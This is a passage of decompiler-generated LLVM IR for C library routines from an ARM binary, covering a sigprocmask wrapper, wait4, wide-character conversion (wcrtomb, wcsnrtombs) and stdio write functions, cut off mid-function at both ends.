  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ec6c = inttoptr i32 %v0_ec60 to i32*
  store i32 22, i32* %v2_ec6c, align 4
  %v0_ec98.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec98

dec_label_pc_ec74:                                ; preds = %.thread, %bb
  %v7_ec74 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_ec74, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_ec74, -4095
  br i1 %tmp13, label %dec_label_pc_ec94, label %dec_label_pc_ec84

dec_label_pc_ec84:                                ; preds = %dec_label_pc_ec74
  %v0_ec84 = call i32 @__errno_location()
  %v0_ec88 = load i32, i32* %r4.global-to-local, align 4
  %v1_ec88 = sub i32 0, %v0_ec88
  %v2_ec8c = inttoptr i32 %v0_ec84 to i32*
  store i32 %v1_ec88, i32* %v2_ec8c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec94

dec_label_pc_ec94:                                ; preds = %dec_label_pc_ec74, %dec_label_pc_ec84
  %v0_ec94 = phi i32 [ %v7_ec74, %dec_label_pc_ec74 ], [ -1, %dec_label_pc_ec84 ]
  store i32 %v0_ec94, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec98

dec_label_pc_ec98:                                ; preds = %dec_label_pc_ec60, %dec_label_pc_ec94
  %v0_ec98 = phi i32 [ %v0_ec98.pre, %dec_label_pc_ec60 ], [ %v0_ec94, %dec_label_pc_ec94 ]
  %v2_ec9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ec9c, i32* @r4, align 4
  ret i32 %v0_ec98

; uselistorder directives
  uselistorder i32 %v7_ec74, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ec98, { 1, 0 }
  uselistorder label %dec_label_pc_ec94, { 1, 0 }
  uselistorder label %dec_label_pc_ec74, { 1, 0 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eca0 = load i32, i32* @r4, align 4
  store i32 %v3_eca0, i32* %stack_var_-8, align 4
  %v0_eca4 = call i32 @wait4()
  store i32 %v0_eca4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_eca4, -4095
  br i1 %tmp, label %dec_label_pc_ecc4, label %dec_label_pc_ecb4

dec_label_pc_ecb4:                                ; preds = %entry
  %v0_ecb4 = call i32 @__errno_location()
  %v0_ecb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_ecb8 = sub i32 0, %v0_ecb8
  %v2_ecbc = inttoptr i32 %v0_ecb4 to i32*
  store i32 %v1_ecb8, i32* %v2_ecbc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ecc4

dec_label_pc_ecc4:                                ; preds = %entry, %dec_label_pc_ecb4
  %v0_ecc4 = phi i32 [ %v0_eca4, %entry ], [ -1, %dec_label_pc_ecb4 ]
  %v2_ecc8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ecc8, i32* @r4, align 4
  ret i32 %v0_ecc4

; uselistorder directives
  uselistorder i32 %v0_eca4, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ecc4, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1fe2c.662 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_ecdc = icmp eq i32 %arg1, 0
  br i1 %v2_ecdc, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_ece4 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_ed0c = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_ed00 = phi i32 [ %arg1, %.thread ], [ %v3_ece4, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_ecf8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_ed04 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_ed04, i32* %stack_var_-16, align 4
  store i32 %v0_ed0c, i32* %stack_var_-12, align 4
  %v5_ed14 = inttoptr i32 %v0_ed00 to i8*
  %v6_ed14 = call i32 @__GI_wcsnrtombs(i8* %v5_ed14, i32 %v2_ecf8, i32 1, i32 16, i32 %arg3)
  %v2_ed18 = icmp eq i32 %v6_ed14, 0
  br i1 %v2_ed18, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_ed24 = phi i32 [ %v6_ed14, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_ed24

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_ed34 = load i32, i32* @r2, align 4
  store i32 %v0_ed34, i32* @r3, align 4
  %v0_ed3c = load i32, i32* @r0, align 4
  %v1_ed3c = load i32, i32* @r1, align 4
  %v5_ed3c = inttoptr i32 %v0_ed3c to i8*
  %v6_ed3c = call i32 @__GI_wcsnrtombs(i8* %v5_ed3c, i32 %v1_ed3c, i32 -1, i32 %v0_ed34, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_ed3c
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ed48 = load i32, i32* @r4, align 4
  store i32 %v3_ed48, i32* %stack_var_-8, align 4
  %v10_ed4c = icmp eq i32 %tmp, %arg2
  br i1 %v10_ed4c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_ed541 = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ed68

bb:                                               ; preds = %entry
  %v4_ed50 = icmp eq i8* %arg1, null
  %v0_ed54 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @ip, align 4
  br i1 %v4_ed50, label %dec_label_pc_ed68, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eda4

dec_label_pc_ed68:                                ; preds = %.thread, %bb
  %v1_eda8.ph = phi i32 [ %v0_ed54, %bb ], [ %v0_ed541, %.thread ]
  %v2_ed583.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_ed68 = icmp eq i8* %arg1, null
  store i32 %v2_ed583.ph, i32* @ip, align 4
  br i1 %v3_ed68, label %.thread4, label %dec_label_pc_ed9c

.thread4:                                         ; preds = %dec_label_pc_ed68
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_eda4

dec_label_pc_ed80:                                ; preds = %dec_label_pc_edbc
  %v0_ed80 = call i32 @__errno_location()
  store i32 %v0_ed80, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ed8c = inttoptr i32 %v0_ed80 to i32*
  store i32 84, i32* %v2_ed8c, align 4
  %v0_edf8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_edf8

dec_label_pc_ed94:                                ; preds = %dec_label_pc_edcc
  %v3_edd0 = zext i8 %v2_edd0 to i32
  store i32 %v3_edd0, i32* @lr, align 4
  br label %dec_label_pc_edec

dec_label_pc_ed9c:                                ; preds = %dec_label_pc_ed68
  store i32 %v2_ed583.ph, i32* @ip, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eda4

dec_label_pc_eda4:                                ; preds = %bb27, %.thread4, %dec_label_pc_ed9c
  %v1_eda820 = phi i32 [ %v0_ed54, %bb27 ], [ %v1_eda8.ph, %.thread4 ], [ %v1_eda8.ph, %dec_label_pc_ed9c ]
  %v2_edcc14 = phi i32 [ %tmp, %bb27 ], [ %v2_ed583.ph, %.thread4 ], [ %v2_ed583.ph, %dec_label_pc_ed9c ]
  %v1_eda4 = load i32, i32* @r3, align 4
  %v3_eda4 = icmp uge i32 %v1_eda820, %v1_eda4
  %v1_eda4.v1_eda820 = select i1 %v3_eda4, i32 %v1_eda4, i32 %v1_eda820
  store i32 %v1_eda4.v1_eda820, i32* %r4.global-to-local, align 4
  %v1_edb0 = inttoptr i32 %arg2 to i32*
  %v2_edb0 = load i32, i32* %v1_edb0, align 4
  store i32 %v2_edb0, i32* @lr, align 4
  store i32 %v1_eda4.v1_eda820, i32* %r0.global-to-local, align 4
  %v2_ede48 = icmp eq i32 %v1_eda4.v1_eda820, 0
  br i1 %v2_ede48, label %dec_label_pc_edec, label %dec_label_pc_edbc

dec_label_pc_edbc:                                ; preds = %dec_label_pc_eda4, %dec_label_pc_eddc.dec_label_pc_edbc_crit_edge
  %v2_edcc = phi i32 [ %v2_eddc, %dec_label_pc_eddc.dec_label_pc_edbc_crit_edge ], [ %v2_edcc14, %dec_label_pc_eda4 ]
  %v0_edc4 = phi i32 [ %v0_edbc.pre, %dec_label_pc_eddc.dec_label_pc_edbc_crit_edge ], [ %v2_edb0, %dec_label_pc_eda4 ]
  %v1_edbc = inttoptr i32 %v0_edc4 to i32*
  %v2_edbc = load i32, i32* %v1_edbc, align 4
  %v1_edc4 = add i32 %v0_edc4, 4
  store i32 %v1_edc4, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_edbc, 127
  br i1 %tmp36, label %dec_label_pc_ed80, label %dec_label_pc_edcc

dec_label_pc_edcc:                                ; preds = %dec_label_pc_edbc
  %v1_edcc = trunc i32 %v2_edbc to i8
  %v3_edcc = inttoptr i32 %v2_edcc to i8*
  store i8 %v1_edcc, i8* %v3_edcc, align 1
  %v0_edd0 = load i32, i32* @ip, align 4
  %v1_edd0 = inttoptr i32 %v0_edd0 to i8*
  %v2_edd0 = load i8, i8* %v1_edd0, align 1
  %v2_edd4 = icmp eq i8 %v2_edd0, 0
  br i1 %v2_edd4, label %dec_label_pc_ed94, label %dec_label_pc_eddc

dec_label_pc_eddc:                                ; preds = %dec_label_pc_edcc
  %v1_eddc = load i32, i32* %r2.global-to-local, align 4
  %v2_eddc = add i32 %v1_eddc, %v0_edd0
  store i32 %v2_eddc, i32* @ip, align 4
  %v0_ede0 = load i32, i32* %r0.global-to-local, align 4
  %v1_ede0 = add i32 %v0_ede0, -1
  store i32 %v1_ede0, i32* %r0.global-to-local, align 4
  %v2_ede4 = icmp eq i32 %v1_ede0, 0
  br i1 %v2_ede4, label %dec_label_pc_edec, label %dec_label_pc_eddc.dec_label_pc_edbc_crit_edge

dec_label_pc_eddc.dec_label_pc_edbc_crit_edge:    ; preds = %dec_label_pc_eddc
  %v0_edbc.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_edbc

dec_label_pc_edec:                                ; preds = %dec_label_pc_eddc, %dec_label_pc_eda4, %dec_label_pc_ed94
  %v0_edec = phi i32 [ %v0_edd0, %dec_label_pc_ed94 ], [ %v2_edcc14, %dec_label_pc_eda4 ], [ %v2_eddc, %dec_label_pc_eddc ]
  %v1_edec = load i32, i32* @sp, align 4
  %v9_edec = icmp eq i32 %v0_edec, %v1_edec
  br i1 %v9_edec, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_edec
  %v1_edf0 = load i32, i32* @lr, align 4
  store i32 %v1_edf0, i32* %v1_edb0, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_edec, %bb30
  %v0_edf4 = load i32, i32* %r0.global-to-local, align 4
  %v1_edf4 = load i32, i32* %r4.global-to-local, align 4
  %v2_edf4 = sub i32 %v1_edf4, %v0_edf4
  store i32 %v2_edf4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_edf8

dec_label_pc_edf8:                                ; preds = %dec_label_pc_ed80, %bb31
  %v0_edf8 = phi i32 [ %v0_edf8.pre, %dec_label_pc_ed80 ], [ %v2_edf4, %bb31 ]
  store i32 %v0_edf8, i32* %r0.global-to-local, align 4
  %v2_ee00 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ee00, i32* %r4.global-to-local, align 4
  ret i32 %v0_edf8

; uselistorder directives
  uselistorder i32 %v0_edf8, { 1, 0 }
  uselistorder i32 %v1_ede0, { 1, 0 }
  uselistorder i32 %v2_eddc, { 0, 2, 1 }
  uselistorder i32 %v2_edbc, { 1, 0 }
  uselistorder i32 %v2_edcc14, { 1, 0 }
  uselistorder i32 %v1_eda8.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 6, 5, 3, 2, 0 }
  uselistorder i32* @sp, { 1, 2, 0 }
  uselistorder i32 127, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_edf8, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_edbc, { 1, 0 }
  uselistorder label %dec_label_pc_eda4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ed68, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_ee182 = icmp eq i32 %arg3, 0
  store i1 %v2_ee182, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_ee182, label %dec_label_pc_eeb8, label %dec_label_pc_ee24

dec_label_pc_ee18thread-pre-split:                ; preds = %bb22
  %v3_ee3c = load i32, i32* %r7.global-to-local, align 4
  %v5_ee3c = add i32 %v3_ee3c, %v4_ee30
  store i32 %v5_ee3c, i32* %r7.global-to-local, align 4
  %v5_ee40 = sub i32 %v0_ee38, %v4_ee30
  store i32 %v5_ee40, i32* %r5.global-to-local, align 4
  %v2_ee18 = icmp eq i32 %v5_ee40, 0
  store i1 %v2_ee18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_ee40, i32* @r2, align 4
  br i1 %v2_ee18, label %dec_label_pc_ee18.dec_label_pc_eeb8.loopexit_crit_edge, label %dec_label_pc_ee24

dec_label_pc_ee24:                                ; preds = %entry, %dec_label_pc_ee18thread-pre-split
  %v0_ee28 = phi i32 [ %v5_ee3c, %dec_label_pc_ee18thread-pre-split ], [ %arg2, %entry ]
  %v0_ee24.in = phi i32 [ %v5_ee40, %dec_label_pc_ee18thread-pre-split ], [ %arg3, %entry ]
  %v0_ee24 = icmp slt i32 %v0_ee24.in, 0
  br i1 %v0_ee24, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_ee24
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_ee24, %bb
  %v0_ee2c = load i32, i32* @r4, align 4
  %v1_ee2c = add i32 %v0_ee2c, 4
  %v2_ee2c = inttoptr i32 %v1_ee2c to i32*
  %v3_ee2c = load i32, i32* %v2_ee2c, align 4
  store i32 %v3_ee2c, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_ee28 to i32*
  %v4_ee30 = call i32 @__libc_write(i32 %v3_ee2c, i32* %tmp23)
  store i32 %v4_ee30, i32* %r0.global-to-local, align 4
  %v1_ee34 = icmp slt i32 %v4_ee30, 0
  %v2_ee34 = icmp eq i32 %v4_ee30, 0
  store i1 %v2_ee34, i1* %cpsr_z.global-to-local, align 1
  %v0_ee38 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_ee38, i32* %r6.global-to-local, align 4
  br i1 %v1_ee34, label %dec_label_pc_ee48, label %dec_label_pc_ee18thread-pre-split

dec_label_pc_ee48:                                ; preds = %bb22
  %v0_ee48 = load i32, i32* @r4, align 4
  %v1_ee48 = inttoptr i32 %v0_ee48 to i32*
  %v2_ee48 = load i32, i32* %v1_ee48, align 4
  store i32 %v2_ee48, i32* %r3.global-to-local, align 4
  %v1_ee4c = add i32 %v0_ee48, 8
  store i32 %v1_ee4c, i32* %r0.global-to-local, align 4
  %v1_ee50 = inttoptr i32 %v1_ee4c to i32*
  %v2_ee50 = load i32, i32* %v1_ee50, align 4
  store i32 %v2_ee50, i32* %r0.global-to-local, align 4
  %v3_ee50 = add i32 %v0_ee48, 12
  %v4_ee50 = inttoptr i32 %v3_ee50 to i32*
  %v5_ee50 = load i32, i32* %v4_ee50, align 4
  %v1_ee54 = or i32 %v2_ee48, 8
  store i32 %v1_ee54, i32* %r3.global-to-local, align 4
  %v3_ee58 = sdiv i32 %v2_ee48, 256
  %v2_ee5c = sub i32 %v5_ee50, %v2_ee50
  store i32 %v2_ee5c, i32* %r2.global-to-local, align 4
  %v9_ee5c = icmp eq i32 %v5_ee50, %v2_ee50
  store i1 %v9_ee5c, i1* %cpsr_z.global-to-local, align 1
  %v1_ee60 = trunc i32 %v3_ee58 to i8
  %v3_ee60 = add i32 %v0_ee48, 1
  %v4_ee60 = inttoptr i32 %v3_ee60 to i8*
  store i8 %v1_ee60, i8* %v4_ee60, align 1
  %v0_ee64 = load i32, i32* %r3.global-to-local, align 4
  %v1_ee64 = trunc i32 %v0_ee64 to i8
  %v2_ee64 = load i32, i32* @r4, align 4
  %v3_ee64 = inttoptr i32 %v2_ee64 to i8*
  store i8 %v1_ee64, i8* %v3_ee64, align 1
  %v0_ee68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee68, label %dec_label_pc_ee48.dec_label_pc_eeb4_crit_edge, label %dec_label_pc_ee6c

dec_label_pc_ee48.dec_label_pc_eeb4_crit_edge:    ; preds = %dec_label_pc_ee48
  %v0_eeb4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_eeb4

dec_label_pc_ee6c:                                ; preds = %dec_label_pc_ee48
  %v0_ee6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ee6c = load i32, i32* %r5.global-to-local, align 4
  %v9_ee6c = icmp eq i32 %v0_ee6c, %v1_ee6c
  store i1 %v9_ee6c, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_ee6c, %v1_ee6c
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_ee6c
  store i32 %v0_ee6c, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_ee6c, %bb24
  %v0_ee74.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_ee78.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_ee98
  %v2_ee78 = phi i32 [ %v2_ee78.pre, %.preheader ], [ %v1_ee9c, %dec_label_pc_ee98 ]
  %v0_ee74 = phi i32 [ %v0_ee74.pre, %.preheader ], [ %v1_ee84, %dec_label_pc_ee98 ]
  %v1_ee74 = inttoptr i32 %v0_ee74 to i8*
  %v2_ee74 = load i8, i8* %v1_ee74, align 1
  %v3_ee74 = zext i8 %v2_ee74 to i32
  store i32 %v3_ee74, i32* %r3.global-to-local, align 4
  %v3_ee78 = inttoptr i32 %v2_ee78 to i8*
  store i8 %v2_ee74, i8* %v3_ee78, align 1
  %v0_ee7c = load i32, i32* %r0.global-to-local, align 4
  %v1_ee7c = inttoptr i32 %v0_ee7c to i8*
  %v2_ee7c = load i8, i8* %v1_ee7c, align 1
  %v3_ee7c = zext i8 %v2_ee7c to i32
  store i32 %v3_ee7c, i32* %r3.global-to-local, align 4
  %v7_ee80 = icmp eq i8 %v2_ee7c, 10
  store i1 %v7_ee80, i1* %cpsr_z.global-to-local, align 1
  %v0_ee84 = load i32, i32* %r7.global-to-local, align 4
  %v1_ee84 = add i32 %v0_ee84, 1
  store i32 %v1_ee84, i32* %r7.global-to-local, align 4
  br i1 %v7_ee80, label %dec_label_pc_ee8c, label %dec_label_pc_ee98

dec_label_pc_ee8c:                                ; preds = %bb25
  %v0_ee8c = load i32, i32* @r4, align 4
  %v1_ee8c = add i32 %v0_ee8c, 1
  %v2_ee8c = inttoptr i32 %v1_ee8c to i8*
  %v3_ee8c = load i8, i8* %v2_ee8c, align 1
  %v4_ee8c = zext i8 %v3_ee8c to i32
  store i32 %v4_ee8c, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_ee8c, 2
  %v2_ee90 = icmp eq i8 %tmp30, 0
  store i1 %v2_ee90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee90, label %dec_label_pc_ee98, label %dec_label_pc_eea4

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee8c, %bb25
  %v0_ee98 = load i32, i32* %r6.global-to-local, align 4
  %v1_ee98 = add i32 %v0_ee98, -1
  store i32 %v1_ee98, i32* %r6.global-to-local, align 4
  %v7_ee98 = icmp eq i32 %v0_ee98, 1
  store i1 %v7_ee98, i1* %cpsr_z.global-to-local, align 1
  %v1_ee9c = add i32 %v0_ee7c, 1
  store i32 %v1_ee9c, i32* %r0.global-to-local, align 4
  br i1 %v7_ee98, label %dec_label_pc_ee98.dec_label_pc_eea4_crit_edge, label %bb25

dec_label_pc_ee98.dec_label_pc_eea4_crit_edge:    ; preds = %dec_label_pc_ee98
  %v0_eea4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_eea4

dec_label_pc_eea4:                                ; preds = %dec_label_pc_ee8c, %dec_label_pc_ee98.dec_label_pc_eea4_crit_edge
  %v0_eea8 = phi i32 [ %v1_ee9c, %dec_label_pc_ee98.dec_label_pc_eea4_crit_edge ], [ %v0_ee7c, %dec_label_pc_ee8c ]
  %v0_eea4 = phi i32 [ %v0_eea4.pre, %dec_label_pc_ee98.dec_label_pc_eea4_crit_edge ], [ %v0_ee8c, %dec_label_pc_ee8c ]
  %v1_eea4 = add i32 %v0_eea4, 8
  %v2_eea4 = inttoptr i32 %v1_eea4 to i32*
  %v3_eea4 = load i32, i32* %v2_eea4, align 4
  store i32 %v3_eea4, i32* %r3.global-to-local, align 4
  %v2_eea8 = add i32 %v0_eea4, 16
  %v3_eea8 = inttoptr i32 %v2_eea8 to i32*
  store i32 %v0_eea8, i32* %v3_eea8, align 4
  %v0_eeac = load i32, i32* %r3.global-to-local, align 4
  %v1_eeac = load i32, i32* %r0.global-to-local, align 4
  %v2_eeac = sub i32 %v1_eeac, %v0_eeac
  store i32 %v2_eeac, i32* %r3.global-to-local, align 4
  %v1_eeb0 = load i32, i32* %r5.global-to-local, align 4
  %v2_eeb0 = sub i32 %v1_eeb0, %v2_eeac
  store i32 %v2_eeb0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_eeb4

dec_label_pc_eeb4:                                ; preds = %dec_label_pc_ee48.dec_label_pc_eeb4_crit_edge, %dec_label_pc_eea4
  %v0_eeb4 = phi i32 [ %v0_eeb4.pre, %dec_label_pc_ee48.dec_label_pc_eeb4_crit_edge ], [ %v2_eeb0, %dec_label_pc_eea4 ]
  %v1_eeb4 = load i32, i32* %r8.global-to-local, align 4
  %v2_eeb4 = sub i32 %v1_eeb4, %v0_eeb4
  store i32 %v2_eeb4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_eeb8

dec_label_pc_ee18.dec_label_pc_eeb8.loopexit_crit_edge: ; preds = %dec_label_pc_ee18thread-pre-split
  %v0_eeb8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_eeb8

dec_label_pc_eeb8:                                ; preds = %entry, %dec_label_pc_ee18.dec_label_pc_eeb8.loopexit_crit_edge, %dec_label_pc_eeb4
  %v0_eeb8 = phi i32 [ %v2_eeb4, %dec_label_pc_eeb4 ], [ %v0_eeb8.pre.pre, %dec_label_pc_ee18.dec_label_pc_eeb8.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_eeb8, i32* %r0.global-to-local, align 4
  ret i32 %v0_eeb8

; uselistorder directives
  uselistorder i32 %v0_eeb8, { 1, 0 }
  uselistorder i32 %v0_eea4, { 1, 0 }
  uselistorder i32 %v1_ee9c, { 0, 2, 1 }
  uselistorder i32 %v0_ee98, { 1, 0 }
  uselistorder i1 %v2_ee90, { 1, 0 }
  uselistorder i32 %v1_ee84, { 1, 0 }
  uselistorder i32 %v0_ee6c, { 1, 0, 2 }
  uselistorder i32 %v5_ee50, { 1, 0 }
  uselistorder i32 %v2_ee50, { 1, 0, 2 }
  uselistorder i32 %v0_ee38, { 1, 0 }
  uselistorder i32 %v4_ee30, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_ee40, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 9, 8, 0 }
  uselistorder label %dec_label_pc_eeb8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_eeb4, { 1, 0 }
  uselistorder label %dec_label_pc_eea4, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_ee24, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_eec0 = load i32, i32* @r4, align 4
  store i32 %v3_eec0, i32* %stack_var_-20, align 4
  %v6_eec0 = load i32, i32* @r5, align 4
  %v9_eec0 = load i32, i32* @r6, align 4
  %v12_eec0 = load i32, i32* @r7, align 4
  %v15_eec0 = load i32, i32* @lr, align 4
  %v1_eec4 = add i32 %arg3, 1
  %v2_eec4 = inttoptr i32 %v1_eec4 to i8*
  %v3_eec4 = load i8, i8* %v2_eec4, align 1
  %v4_eec4 = zext i8 %v3_eec4 to i32
  %v3_eec8 = mul nuw nsw i32 %v4_eec4, 256
  %v1_eecc = and i32 %v3_eec8, 512
  store i32 %v1_eecc, i32* @r4, align 4
  %v2_eecc = icmp eq i32 %v1_eecc, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_eecc, label %dec_label_pc_eee0, label %dec_label_pc_efdc

dec_label_pc_eee0:                                ; preds = %entry
  %v1_eee0 = add i32 %arg3, 4
  %v2_eee0 = inttoptr i32 %v1_eee0 to i32*
  %v3_eee0 = load i32, i32* %v2_eee0, align 4
  %v1_eee8 = add i32 %arg3, 16
  %v2_eee8 = inttoptr i32 %v1_eee8 to i32*
  %v3_eee8 = load i32, i32* %v2_eee8, align 4
  store i32 %v3_eee8, i32* @r0, align 4
  %v1_eeec = add i32 %arg3, 12
  %v2_eeec = inttoptr i32 %v1_eeec to i32*
  %v3_eeec = load i32, i32* %v2_eeec, align 4
  %v4_eef0 = icmp eq i32 %v3_eee0, -2
  %v2_eef4 = sub i32 %v3_eeec, %v3_eee8
  br i1 %v4_eef0, label %dec_label_pc_eef4, label %dec_label_pc_ef1c

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eee0
  %v3_eef8 = icmp ugt i32 %v2_eef4, %arg2
  br i1 %v3_eef8, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_eef4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_eef4, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_eef4, %dec_label_pc_eef4 ]
  %v0_ef00 = phi i32 [ %arg2, %bb ], [ %v2_eef4, %dec_label_pc_eef4 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_ef00, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_ef08 = call i32 @memcpy()
  %v0_ef0c = load i32, i32* @r5, align 4
  %v1_ef0c = add i32 %v0_ef0c, 16
